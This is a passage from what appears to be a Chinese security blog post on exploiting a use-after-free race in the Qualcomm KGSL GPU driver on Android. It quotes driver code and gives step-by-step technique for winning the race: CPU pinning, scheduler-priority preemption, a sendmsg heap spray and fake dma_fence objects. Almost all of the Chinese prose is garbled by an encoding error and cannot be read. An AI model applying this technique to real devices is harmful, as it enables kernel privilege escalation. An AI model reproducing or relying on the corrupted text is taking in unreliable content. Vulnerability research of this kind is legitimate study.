<p><code>kgsl_timeline_fence_alloc</code>åˆ›å»ºä¸€ä¸ª<code>dma_fence</code>ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°<code>timeline</code>ä¸Šã€‚ç„¶åè°ƒç”¨è€…å¾—åˆ°ä¸€ä¸ªä¸<code>dma_fence</code>å¯¹åº”çš„<code>sync_file</code>çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å½“<code>sync_file</code>è¢«å…³é—­æ—¶ï¼Œ<code>dma_fence</code>çš„<code>refcount</code>è¢«å‡å°‘åˆ°0ã€‚</p>
<p>ç¬¬äºŒä¸ªæ˜¯ <code>IOCTL_KGSL_TIMELINE_WAIT</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_wait</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    fence = kgsl_timelines_to_fence_array(device, param-&gt;timelines,</span><br><span class="line">        param-&gt;count, param-&gt;timelines_size,</span><br><span class="line">        (param-&gt;flags == KGSL_TIMELINE_WAIT_ANY));     <span class="comment">//&lt;------ dma_fence created and added to timeline</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (!timeout)</span><br><span class="line">        ret = dma_fence_is_signaled(fence) ? <span class="number">0</span> : -EBUSY;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = dma_fence_wait_timeout(fence, <span class="literal">true</span>, timeout);   <span class="comment">//&lt;----- 1.</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dma_fence_put(fence);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>kgsl_timelines_to_fence_array</code>åˆ›å»º<code>dma_fence</code>å¯¹è±¡ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°<code>timeline</code>ä¸Šã€‚å¦‚æœæŒ‡å®šäº†ä¸€ä¸ª <code>timeout</code> ï¼Œé‚£ä¹ˆè¯¥è°ƒç”¨å°†è¿›å…¥<code>dma_fence_wait_timeout</code>ï¼ˆè·¯å¾„æ ‡è®°ä¸º1ï¼‰è¿›è¡Œç­‰å¾…ï¼Œç›´åˆ°è¶…æ—¶æˆ–çº¿ç¨‹æ”¶åˆ°ä¸­æ–­ã€‚åœ¨<code>dma_fence_wait_timeout</code>ç»“æŸåï¼Œ<code>dma_fence_put</code>è¢«è°ƒç”¨ï¼Œä»¥å°†<code>dma_fence</code>çš„<code>refcount</code>å‡å°‘åˆ°0ï¼Œé‡Šæ”¾è¢«æ·»åŠ åˆ°<code>timeline</code>ä¸Šçš„<code>dma_fence</code>ã€‚</p>
<p>è™½ç„¶<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>ä¹çœ‹ä¹‹ä¸‹ä¼¼ä¹æ›´å®¹æ˜“ä½¿ç”¨å’Œæ§åˆ¶ï¼Œä½†å®é™…ä¸Šï¼Œå…³é—­<code>sync_file</code>äº§ç”Ÿçš„å¼€é”€ä½¿å¾—é”€æ¯<code>dma_fence</code>çš„æ—¶é—´ä¸é‚£ä¹ˆå¯é ã€‚å› æ­¤ï¼Œå¯¹äºè¿™ä¸ªbugï¼Œè¿™é‡Œä½¿ç”¨<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>æ¥åˆ›å»ºå’Œæ·»åŠ æŒä¹…åŒ–çš„<code>dma_fence</code>å¯¹è±¡æ¥å¡«å……<code>timeline-&gt;fences</code>åˆ—è¡¨ï¼Œä»¥æ‰©å¤§ç«äº‰çª—å£ï¼Œè€Œç”¨äºUAFæ¼æ´çš„æœ€åä¸€ä¸ª<code>dma_fence</code>å¯¹è±¡æ˜¯ä½¿ç”¨<code>IOCTL_KGSL_TIMELINE_WAIT</code>æ·»åŠ çš„ï¼Œå½“å‘é€ä¸­æ–­ä¿¡å·ç»™è°ƒç”¨<code>IOCTL_KGSL_TIMELINE_WAIT</code>çš„çº¿ç¨‹ï¼Œå®ƒå°±è¢«é‡Šæ”¾ã€‚</p>
<h2 id="Widening-the-tiny-race-window"><a href="#Widening-the-tiny-race-window" class="headerlink" title="Widening the tiny race window"></a>Widening the tiny race window</h2><p>ä¸ºäº†åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œéœ€è¦åœ¨ä»¥ä¸‹ä»£ç å—ä¸­æ ‡è®°çš„ç¬¬ä¸€ä¸ªç«äº‰çª—å£å†…åˆ é™¤<code>kgsl_timeline</code>çš„ <code>fences</code> åˆ—è¡¨ä¸­çš„<code>dma_fence</code>çš„<code>refcount</code>ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//BEGIN OF FIRST RACE WINDOW</span></span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">        dma_fence_get(&amp;fence-&gt;base);</span><br><span class="line">    list_replace_init(&amp;timeline-&gt;fences, &amp;temp);</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    <span class="comment">//END OF FIRST RACE WINDOW</span></span><br><span class="line">    <span class="comment">//BEGIN OF SECOND RACE WINDOW</span></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    <span class="comment">//END OF SECOND RACE WINDOW</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚å‰æ‰€è¿°ï¼Œé€šè¿‡å‘<code>timeline-&gt;fences</code>æ·»åŠ å¤§é‡çš„<code>dma_fence</code>å¯¹è±¡ï¼Œå¯ä»¥æ‰©å¤§ç¬¬ä¸€ä¸ªç«äº‰çª—å£ï¼Œè¿™ä½¿å¾—åœ¨è¿™ä¸ªçª—å£å†…å¾ˆå®¹æ˜“è§¦å‘<code>refcount</code>çš„å‡å°‘ã€‚ç„¶è€Œï¼Œä¸ºäº†åˆ©ç”¨è¿™ä¸ªé”™è¯¯ï¼Œä¸‹é¢çš„ä»£ç ä»¥åŠå¯¹è±¡æ›¿æ¢å¿…é¡»åœ¨ç¬¬äºŒä¸ªç«äº‰çª—å£ç»“æŸå‰å®Œæˆï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irqsave(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">list_for_each_entry_safe(cur, temp, &amp;timeline-&gt;fences, node) &#123;</span><br><span class="line">    <span class="keyword">if</span> (f != cur)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    list_del_init(&amp;f-&gt;node);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irqrestore(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">trace_kgsl_timeline_fence_release(f-&gt;timeline-&gt;id, fence-&gt;seqno);</span><br><span class="line">kgsl_timeline_put(f-&gt;timeline);</span><br><span class="line">dma_fence_free(fence);</span><br></pre></td></tr></table></figure>

<p>å¦‚å‰æ‰€è¿°ï¼Œç”±äº<code>spin_lock</code>çš„å­˜åœ¨ï¼Œåœ¨ç¬¬ä¸€ä¸ªç«äº‰çª—å£ç»“æŸä¹‹å‰ï¼Œä¸Šè¿°ä»£ç ä¸èƒ½æ‰§è¡Œï¼Œä½†åœ¨è¿è¡Œè¿™æ®µä»£ç æ—¶ï¼Œ<code>timeline-&gt;fence</code>å·²ç»è¢«æ¸…ç©ºï¼Œæ‰€ä»¥å¾ªç¯ä¼šå¾ˆå¿«è¿è¡Œã€‚ç„¶è€Œï¼Œç”±äº<code>dma_fence_free</code>ä½¿ç”¨äº†<code>kfree_rcu</code>ï¼Œå®é™…é‡Šæ”¾<code>fence</code>çš„æ—¶é—´è¢«æ¨è¿Ÿäº†ã€‚è¿™ä½¿å¾—æˆ‘ä»¬ä¸å¯èƒ½åœ¨ç¬¬äºŒä¸ªç«äº‰çª—å£ç»“æŸå‰æ›¿æ¢å·²é‡Šæ”¾çš„<code>fence</code>ï¼Œé™¤éèƒ½æ“çºµè°ƒåº¦å™¨ã€‚è¿™é‡Œä½¿ç”¨[Exploiting race conditions on (ancient) Linux](<a target="_blank" rel="noopener" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019">https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019</a> - Exploiting race conditions on Linux.pdf)ï¼Œå¦ä¸€ä¸ªAndroidæ¼æ´ä¸­ä¹Ÿä½¿ç”¨äº†è¿™é¡¹<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/one_day_short_of_a_fullchain_android/">æŠ€æœ¯</a>ï¼Œä»¥æ‰©å¤§è¿™ä¸ªç«äº‰çª—å£ã€‚</p>
<p><strong>ä¸‹é¢æ˜¯å…³äºè¿™é¡¹æŠ€æœ¯çš„æ¦‚è¿°ï¼š</strong></p>
<p><strong>ä¸ºäº†ç¡®ä¿æ¯ä¸ªä»»åŠ¡ï¼ˆçº¿ç¨‹æˆ–è¿›ç¨‹ï¼‰æœ‰å…¬å¹³çš„CPUæ—¶é—´ç‰‡ï¼ŒLinuxå†…æ ¸è°ƒåº¦ç¨‹åºå¯ä»¥ä¸­æ–­ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ä»»åŠ¡ï¼Œå¹¶å°†å…¶æç½®ï¼Œä»¥ä¾¿å¦ä¸€ä¸ªä»»åŠ¡å¯ä»¥è¿è¡Œã€‚è¿™ç§ä¸­æ–­å’Œåœæ­¢ä»»åŠ¡çš„è¡Œä¸ºè¢«ç§°ä¸ºæŠ¢å ï¼ˆè¢«ä¸­æ–­çš„ä»»åŠ¡è¢«æŠ¢å ï¼‰ã€‚ä¸€ä¸ªä»»åŠ¡ä¹Ÿå¯ä»¥æŠŠè‡ªå·±æç½®èµ·æ¥ï¼Œè®©å¦ä¸€ä¸ªä»»åŠ¡è¿è¡Œï¼Œæ¯”å¦‚å½“å®ƒåœ¨ç­‰å¾…ä¸€äº›I&#x2F;Oè¾“å…¥æ—¶ï¼Œæˆ–è€…å½“å®ƒè°ƒç”¨<code>sched_yield()</code>æ—¶ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¯´è¯¥ä»»åŠ¡æ˜¯è‡ªæ„¿æŠ¢å çš„ã€‚æŠ¢å ä¹Ÿå¯ä»¥å‘ç”Ÿåœ¨ç³»ç»Ÿè°ƒç”¨å†…éƒ¨ï¼Œæ¯”å¦‚<code>ioctl</code>è°ƒç”¨ï¼Œåœ¨Androidä¸Šï¼Œé™¤äº†ä¸€äº›å…³é”®åŒºåŸŸï¼ˆæ¯”å¦‚æŒæœ‰è‡ªæ—‹é”ï¼‰ï¼Œä»»åŠ¡å¯ä»¥è¢«æŠ¢å ã€‚è¿™ç§è¡Œä¸ºå¯ä»¥é€šè¿‡ä½¿ç”¨CPUäº²å’ŒåŠ›å’Œä»»åŠ¡ä¼˜å…ˆçº§æ¥æ“çºµã€‚</strong></p>
<p><strong>é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªä»»åŠ¡ä»¥<code>SCHED_NORMAL</code>çš„ä¼˜å…ˆçº§è¿è¡Œï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨<code>sched_setscheduler</code>è°ƒç”¨ï¼ˆæˆ–çº¿ç¨‹çš„<code>pthread_setschedparam</code>ï¼‰è®¾ç½®ä¸€ä¸ªè¾ƒä½çš„ä¼˜å…ˆçº§<code>SCHED_IDLE</code>ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥ç”¨<code>sched_setaffinity</code>å°†å…¶å›ºå®šåœ¨ä¸€ä¸ªCPUä¸Šï¼Œè¿™å°†åªå…è®¸å®ƒåœ¨ä¸€ä¸ªç‰¹å®šçš„CPUä¸Šè¿è¡Œã€‚é€šè¿‡å°†ä¸¤ä¸ªä»»åŠ¡ï¼ˆä¸€ä¸ªå…·æœ‰<code>SCHED_NORMAL</code>ä¼˜å…ˆçº§ï¼Œå¦ä¸€ä¸ªå…·æœ‰<code>SCHED_IDLE</code>ä¼˜å…ˆçº§ï¼‰å›ºå®šåœ¨åŒä¸€ä¸ªCPUä¸Šï¼Œå¯ä»¥æ§åˆ¶æŠ¢å çš„æ—¶é—´ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</strong></p>
<ol>
<li><strong>é¦–å…ˆè®©<code>SCHED_NORMAL</code>ä»»åŠ¡æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå¯¼è‡´å®ƒæš‚åœå’Œç­‰å¾…ã€‚ä¾‹å¦‚ï¼Œå®ƒå¯ä»¥ä»ä¸€ä¸ªæ²¡æœ‰æ•°æ®è¿›å…¥çš„ç®¡é“ä¸­è¯»å–æ•°æ®ï¼Œç„¶åå®ƒå°†ç­‰å¾…æ›´å¤šçš„æ•°æ®ï¼Œå¹¶ä¸»åŠ¨æŠ¢å è‡ªå·±çš„ä½ç½®ï¼Œä»¥ä¾¿<code>SCHED_IDLE</code>ä»»åŠ¡å¯ä»¥è¿è¡Œã€‚</strong></li>
<li><strong>å½“<code>SCHED_IDLE</code>ä»»åŠ¡æ­£åœ¨è¿è¡Œæ—¶ï¼Œå‘<code>SCHED_NORMAL</code>ä»»åŠ¡ä¸€ç›´åœ¨ç­‰å¾…çš„ç®¡é“å‘é€ä¸€äº›æ•°æ®ã€‚è¿™å°†å”¤é†’<code>SCHED_NORMAL</code>ä»»åŠ¡ï¼Œä½¿å…¶æŠ¢å <code>SCHED_IDLE</code>ä»»åŠ¡ï¼Œç”±äºä»»åŠ¡çš„ä¼˜å…ˆçº§ï¼Œ<code>SCHED_IDLE</code>ä»»åŠ¡å°†è¢«æŠ¢å å¹¶æç½®ã€‚</strong></li>
<li><strong>ç„¶å<code>SCHED_NORMAL</code>ä»»åŠ¡å¯ä»¥è¿è¡Œä¸€ä¸ªç¹å¿™å¾ªç¯ï¼Œä»¥é˜²æ­¢<code>SCHED_IDLE</code>ä»»åŠ¡è¢«å”¤é†’ã€‚</strong></li>
</ol>
<p>åœ¨è¿™ä¸ªbugçš„æ¼æ´åˆ©ç”¨ä¸­ï¼Œè¯¥æŠ€æœ¯ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<ol>
<li><p>åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸Šè¿è¡Œ<code>IOCTL_KGSL_TIMELINE_WAIT</code>ï¼Œå‘<code>kgsl_timeline</code>æ·»åŠ <code>dma_fence</code>å¯¹è±¡ã€‚å°†è¶…æ—¶è®¾ç½®ä¸ºä¸€ä¸ªå¤§å€¼ï¼Œå¹¶ä½¿ç”¨ <code>sched_setaffinity</code> å°†è¿™ä¸ªä»»åŠ¡å›ºå®šåœ¨ä¸€ä¸ª CPU ä¸Šï¼Œç§°ä¹‹ä¸º <code>SPRAY_CPU</code>ã€‚ä¸€æ—¦<code>dma_fence</code>å¯¹è±¡è¢«æ·»åŠ ï¼Œè¿™ä¸ªä»»åŠ¡å°±ä¼šå˜æˆç©ºé—²çŠ¶æ€ï¼Œç›´åˆ°å®ƒæ”¶åˆ°ä¸€ä¸ªä¸­æ–­ã€‚</p>
</li>
<li><p>è®¾ç½®ä¸€ä¸ª<code>SCHED_NORMAL</code>ä»»åŠ¡ï¼Œå¹¶å°†å…¶å›ºå®šåœ¨å¦ä¸€ä¸ªCPUä¸Šï¼ˆ<code>DESTROY_CPU</code>ï¼‰ï¼Œè¯¥ CPU ç›‘å¬ä¸€ä¸ªç©ºç®¡é“ã€‚è¿™å°†å¯¼è‡´è¿™ä¸ªä»»åŠ¡æœ€åˆå˜å¾—ç©ºé—²ï¼Œå¹¶å…è®¸<code>DESTROY_CPU</code>è¿è¡Œä¸€ä¸ªä½ä¼˜å…ˆçº§çš„ä»»åŠ¡ã€‚ä¸€æ—¦ç©ºç®¡é“æ”¶åˆ°ä¸€äº›æ•°æ®ï¼Œè¿™ä¸ªä»»åŠ¡å°±ä¼šè¿è¡Œä¸€ä¸ªç¹å¿™çš„å¾ªç¯ã€‚</p>
</li>
<li><p>åœ¨<code>DESTROY_CPUä¸Š</code>è®¾ç½®ä¸€ä¸ª<code>SCHED_IDLE</code>ä»»åŠ¡ï¼Œå®ƒå°†è¿è¡Œ<code>IOCTL_KGSL_TIMELINE_DESTROY</code>æ¥é”€æ¯æ­¥éª¤ä¸€ä¸­åŠ å…¥<code>dma_fence</code>çš„<code>timeline</code>ã€‚ç”±äºç¬¬äºŒæ­¥ä¸­è®¾ç½®çš„ä»»åŠ¡æ­£åœ¨ç­‰å¾…ç©ºç®¡çš„å“åº”ï¼Œ<code>DESTROY_CPU</code>å°†é¦–å…ˆè¿è¡Œè¿™ä¸ªä»»åŠ¡ã€‚</p>
</li>
<li><p>å‘è¿è¡Œ<code>IOCTL_KGSL_TIMELINE_WAIT</code>çš„ä»»åŠ¡å‘é€ä¸€ä¸ªä¸­æ–­ã€‚ç„¶åï¼Œåœ¨<code>IOCTL_KGSL_TIMELINE_DESTROY</code>åœ¨ç¬¬ä¸€ä¸ªç«äº‰çª—å£å†…è¿è¡Œæ—¶ï¼Œè¯¥ä»»åŠ¡å°†è§£é™¤å°é”å¹¶é‡Šæ”¾<code>dma_fence</code>ã€‚</p>
</li>
<li><p>å†™å…¥<code>SCHED_NORMAL</code>ä»»åŠ¡æ­£åœ¨ç›‘å¬çš„ç©ºç®¡é“ã€‚è¿™å°†å¯¼è‡´<code>SCHED_NORMAL</code>ä»»åŠ¡æŠ¢å <code>SCHED_IDLE</code>ä»»åŠ¡ã€‚ä¸€æ—¦å®ƒæˆåŠŸåœ°æŠ¢å äº†ä»»åŠ¡ï¼Œ<code>DESTROY_CPU</code>å°†è¿è¡Œç¹å¿™å¾ªç¯ï¼Œå¯¼è‡´<code>SCHED_IDLE</code>ä»»åŠ¡è¢«æç½®ã€‚</p>
</li>
<li><p>ç”±äºè¿è¡Œ<code>IOCTL_KGSL_TIMELINE_DESTROY</code>çš„<code>SCHED_IDLE</code>ä»»åŠ¡è¢«æç½®ï¼Œç°åœ¨æœ‰è¶³å¤Ÿçš„æ—¶é—´æ¥å…‹æœ<code>kfree_rcu</code>å¼•å…¥çš„å»¶è¿Ÿï¼Œå¹¶å…è®¸æ­¥éª¤4ä¸­çš„<code>dma_fence</code>è¢«é‡Šæ”¾å’Œæ›¿æ¢ã€‚ä¹‹åï¼Œæ¢å¤<code>IOCTL_KGSL_TIMELINE_DESTROY</code>ï¼Œè¿™æ ·åç»­çš„æ“ä½œå°†åœ¨ç°åœ¨è¢«é‡Šæ”¾å’Œæ›¿æ¢çš„<code>dma_fence</code>å¯¹è±¡ä¸Šæ‰§è¡Œã€‚</p>
</li>
</ol>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸ºåœ¨çº¿ç¨‹æŒæœ‰è‡ªæ—‹é”çš„æ—¶å€™ä¸èƒ½å‘ç”ŸæŠ¢å ï¼Œæ‰€ä»¥<code>IOCTL_KGSL_TIMELINE_DESTROY</code>åªèƒ½åœ¨è‡ªæ—‹é”ä¹‹é—´çš„çª—å£æœŸæŠ¢å ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">      ...</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line">    <span class="comment">//Preemption window</span></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶ä¸Šé¢çš„æŠ¢å çª—å£çœ‹èµ·æ¥éå¸¸å°ï¼Œä½†åœ¨å®è·µä¸­ï¼Œåªè¦<code>SCHED_NORMAL</code>ä»»åŠ¡è¯•å›¾åœ¨ç¬¬ä¸€ä¸ªè‡ªæ—‹é”è¢«æŒæœ‰æ—¶æŠ¢å è¿è¡Œ<code>IOCTL_KGSL_TIMELINE_DESTROY</code>çš„<code>SCHED_IDLE</code>ä»»åŠ¡ï¼Œä¸€æ—¦è‡ªæ—‹é”è¢«é‡Šæ”¾ï¼ŒæŠ¢å å°±ä¼šå‘ç”Ÿï¼Œè¿™ä½¿å¾—åœ¨æ­£ç¡®çš„æ—¶é—´æŠ¢å <code>IOCTL_KGSL_TIMELINE_DESTROY</code>æ›´å®¹æ˜“æˆåŠŸã€‚</p>
<p>ä¸‹å›¾çº¢è‰²å—è¡¨ç¤ºæŒæœ‰è‡ªæ—‹é”çš„åŒºåŸŸï¼Œå› æ­¤ä¸å¯èƒ½æŠ¢å ï¼Œè™šçº¿è¡¨ç¤ºé—²ç½®çš„ä»»åŠ¡ï¼š</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-2.webp" alt="Kernel-2"></p>
<p>å¯¹äºå¯¹è±¡çš„æ›¿æ¢ï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html"><code>sendmsg</code></a>ï¼Œè¿™æ˜¯ä¸€ç§æ ‡å‡†çš„æ–¹æ³•ï¼Œå¯ä»¥ç”¨å—æ§æ•°æ®æ›¿æ¢linuxå†…æ ¸ä¸­çš„å·²é‡Šæ”¾çš„å¯¹è±¡ã€‚ä¸‹é¢æ˜¯å‡å¯¹è±¡æ˜¯å¦‚ä½•è¢«ä½¿ç”¨çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">    dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">    dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">    dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">&#125;</span><br><span class="line">spin_unlock_irq(&amp;timeline-&gt;lock);</span><br></pre></td></tr></table></figure>

<p>ä¸‰ä¸ªä¸åŒçš„å‡½æ•°ï¼Œ<code>dma_fence_set_error</code>ã€<code>dma_fence_signal_locked</code>å’Œ<code>dma_fence_put</code>å°†è¢«è°ƒç”¨ï¼Œå‚æ•°ä¸º<code>fence</code>ã€‚å‡½æ•°<code>dma_fence_set_error</code>å°†å‘<code>fence</code>å¯¹è±¡å†™ä¸€ä¸ªé”™è¯¯ä»£ç ï¼Œè¿™å¯èƒ½å¯¹åˆé€‚çš„å¯¹è±¡æ›¿æ¢æœ‰ç”¨ï¼Œä½†å¯¹<code>sendmsg</code>å¯¹è±¡æ›¿æ¢æ²¡æœ‰ç”¨ï¼Œå‡½æ•°<code>dma_fence_signal_locked</code>å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (unlikely(test_and_set_bit(DMA_FENCE_FLAG_SIGNALED_BIT,   <span class="comment">//&lt;-- 1.</span></span><br><span class="line">                      &amp;fence-&gt;flags)))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Stash the cb_list before replacing it with the timestamp */</span></span><br><span class="line">    list_replace(&amp;fence-&gt;cb_list, &amp;cb_list);                    <span class="comment">//&lt;-- 2.</span></span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123;        <span class="comment">//&lt;-- 3.</span></span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆæ£€æŸ¥<code>fence-&gt;flags</code>ï¼ˆ1ï¼‰ï¼šå¦‚æœ<code>DMA_FENCE_FLAG_SIGNALED_BIT</code>æ ‡å¿—è¢«è®¾ç½®ï¼Œé‚£ä¹ˆ<code>fence</code>å·²ç»è¢«ä¿¡å·åŒ–ï¼Œå‡½æ•°é€€å‡ºã€‚å¦‚æœ<code>fence</code>æ²¡æœ‰è¢«å‘å‡ºä¿¡å·ï¼Œé‚£ä¹ˆä¼šè°ƒç”¨<code>list_replace</code>æ¥ç§»é™¤<code>fence-&gt;cb_list</code>ä¸­çš„å¯¹è±¡ï¼Œå¹¶å°†å…¶æ”¾å…¥ä¸´æ—¶<code>cb_list</code>ä¸­ï¼ˆ2ï¼‰ ä¹‹åï¼Œå­˜å‚¨åœ¨<code>cb_list</code>ä¸­çš„å‡½æ•°è¢«è°ƒç”¨ï¼ˆ3ï¼‰ã€‚æ­£å¦‚åœ¨ <code>kCFI </code>ä¸€èŠ‚ä¸­è§£é‡Šçš„é‚£æ ·ï¼Œå› ä¸º<code>CFI</code>çš„ç¼“è§£ï¼Œè¿™å°†åªå…è®¸è°ƒç”¨æŸç§ç±»å‹çš„å‡½æ•°ï¼›æ­¤å¤–ï¼Œåœ¨è¿™ä¸ªé˜¶æ®µï¼Œç”±äºå¯¹å‡½æ•°åœ°å€ä¸€æ— æ‰€çŸ¥ï¼Œæ‰€ä»¥å¦‚æœèµ°åˆ°è¾¾è¿™ä¸ªè·¯å¾„ï¼Œå¾ˆå¯èƒ½åªä¼šè®©å†…æ ¸å´©æºƒã€‚æ‰€ä»¥ï¼Œåªèƒ½åœ¨å‡å¯¹è±¡ä¸­è®¾ç½®<code>DMA_FENCE_FLAG_SIGNALED_BIT</code>æ ‡å¿—ï¼Œè®©<code>dma_fence_signal_locked</code>æå‰é€€å‡ºã€‚</p>
